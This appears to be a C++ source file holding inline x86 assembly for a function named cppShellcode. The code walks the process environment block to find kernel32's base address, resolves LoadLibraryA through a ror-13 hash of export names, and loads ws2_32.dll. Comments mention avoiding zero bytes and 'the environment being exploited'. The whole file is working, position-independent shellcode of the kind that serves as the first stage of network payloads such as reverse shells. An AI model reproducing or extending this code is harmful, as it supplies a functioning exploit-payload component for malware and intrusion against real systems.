#include <Windows.h>

//extern "C" void __stdcall OutputDebugStringA(char*);
//char* g_pNewLine = "\n";

void __declspec(naked) cppShellcode()
{
    //__asm
    //{
    //    pushad
    //
    //    jmp lSkipData
    //lLibraryName:
    //    _emit 'L'
    //    _emit 'o'
    //    _emit 'a'
    //    _emit 'd'
    //    _emit 'L'
    //    _emit 'i'
    //    _emit 'b'
    //    _emit 'r'
    //    _emit 'a'
    //    _emit 'r'
    //    _emit 'y'
    //    _emit 'A'
    //    _emit 0x0
    //
    //lSkipData:
    //    mov     esi, offset lLibraryName ; 0EC0E4E8Eh
    //    xor     edi, edi            ; Zero edi as it will hold the hash value for the current symbols function name.
    //    xor     eax, eax            ; Zero eax in order to ensure that the high order bytes are zero as this will
    //    cld         
    //compute_hash2:
    //    lodsb                       ; Load the byte at esi, the current symbol name, into al and increment esi.
    //    test    al, al              ; Bitwise test al with itself to see if the end of the string has been reached.
    //    jz      hash_finished2      ; If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
    //    ror     edi, 0xd            ; Rotate the current value of the hash 13 bits to the right.
    //    add     edi, eax            ; Add the current character of the symbol name to the hash accumulator.
    //    jmp     compute_hash2       ; Continue looping through the symbol name.
    //hash_finished2:
    //
    //    popad
    //}

    __asm 
    {
        call    lGetKernel32Base
        mov     esi, 0EC0E4E8Eh
        call    lGetProcAddress
        push    lDllName
        call    eax
        ret

lGetKernel32Base:
        push    esi
        xor     eax, eax
        mov     eax, fs:[eax+0x30]      ;// _TEB.Peb (_PEB* Peb)
        mov     eax, [eax+0x0c]         ;// _PEB.Ldr (_PEB_LDR_DATA* Ldr)
        mov     esi, [eax+0x0c]         ;// _PEB_LDR_DATA.InLoadOrderModuleList (_LIST_ENTRY InLoadOrderModuleList)
        lodsd                           ;// _LDR_DATA_TABLE_ENTRY* of ntdll in eax
        mov     esi, eax                ;// to avoid zeroes in code
        lodsd                           ;// _LDR_DATA_TABLE_ENTRY* of kernel32
        mov     eax, [eax+0x18]         ;// _LDR_DATA_TABLE_ENTRY.DllBase
        pop     esi
        ret

lGetProcAddress:
        pushad
        mov     ebp, [esp+0x1c]         ;// Store the base address of the module that is being loaded from in ebp.
        mov     eax, [ebp+0x3c]         ;// Skip over the MSDOS header to the start of the PE header.
        mov     edx, [ebp+eax+0x78]     ;// The export table is 0x78 bytes from the start of the PE header. Extract it and store the relative address in edx.
        add     edx, ebp                ;// Make the export table address absolute by adding the base address to it.
        mov     ecx, [edx+0x18]         ;// Extract the number of exported items and store it in ecx which will be used as the counter.
        mov     ebx, [edx+0x20]         ;// Extract the names table relative offset and store it in ebx.
        add     ebx, ebp                ;// Make the names table address absolute by adding the base address to it.
FindFunctionLoop:
        jecxz   lFindFunctionFinished   ;// If ecx is zero then the last symbol has been checked and as such jump to
                                        ;// the end of the function. If this condition is ever true then the requested symbol was not resolved properly.
        dec     ecx
        mov     esi, [ebx+ecx*4]        ;// Extract the relative offset of the name associated with the current symbol and store it in esi. 
        add     esi, ebp                ;// Make the address of the symbol name absolute by adding the base address to it.
        ;// Compute hash
        xor     edi, edi                ;// Zero edi as it will hold the hash value for the current symbols function name.
        xor     eax, eax                ;// Zero eax in order to ensure that the high order bytes are zero as this will
                                        ;// hold the value of each character as it walks through the symbol name.
        cld                             ;// Clear the direction flag to ensure that it increments instead of decrements
                                        ;// when using the lods* instructions. This instruction can be optimized out
                                        ;// assuming that the environment being exploited is known to have the DF flag unset.
ComputeHashAgain:
        lodsb                           ;// Load the byte at esi, the current symbol name, into al and increment esi.
        test    al, al                  ;// Bitwise test al with itself to see if the end of the string has been reached.
        jz      ComputeHashFinished     ;// If ZF is set the end of the string has been reached. Jump to the end of the hash calculation.
        ror     edi, 0xd                ;// Rotate the current value of the hash 13 bits to the right.
        add     edi, eax                ;// Add the current character of the symbol name to the hash accumulator.
        jmp     ComputeHashAgain        ;// Continue looping through the symbol name.

ComputeHashFinished:
        //pushad
        //push    esi
        //call    OutputDebugStringA
        //push    g_pNewLine
        //call    OutputDebugStringA
        //popad

        cmp     edi, [esp+0x4]          ;// Check to see if the computed hash matches the requested hash.
        jnz     FindFunctionLoop        ;// If the hashes do not match, continue enumerating the exported symbol list. 
                                        ;// Otherwise, drop down and extract the VMA of the symbol.
        mov     ebx, [edx+0x24]         ;// Extract the ordinals table relative offset and store it in ebx.
        add     ebx, ebp                ;// Make the ordinals table address absolute by adding the base address to it.
        mov     cx, [ebx+2*ecx]         ;// Extract the current symbols ordinal number from the ordinal table. Ordinals are two bytes in size.
        mov     ebx, [edx+0x1c]         ;// Extract the address table relative offset and store it in ebx.
        add     ebx, ebp                ;// Make the address table address absolute by adding the base address to it.
        mov     eax, [ebx+4*ecx]        ;// Extract the relative function offset from its ordinal and store it in eax.
        add     eax, ebp                ;// Make the function’s address absolute by adding the base address to it.
        mov     [esp+0x1c], eax         ;// Overwrite the stack copy of the preserved eax register so that when popad
                                        ;// is finished the appropriate return value will be set.
lFindFunctionFinished:
        popad
        ret

lDllName:
        _emit 'w'
        _emit 's'
        _emit '2'
        _emit '_'
        _emit '3'
        _emit '2'
        _emit '.'
        _emit 'd'
        _emit 'l'
        _emit 'l'
        _emit 0x0
    }
}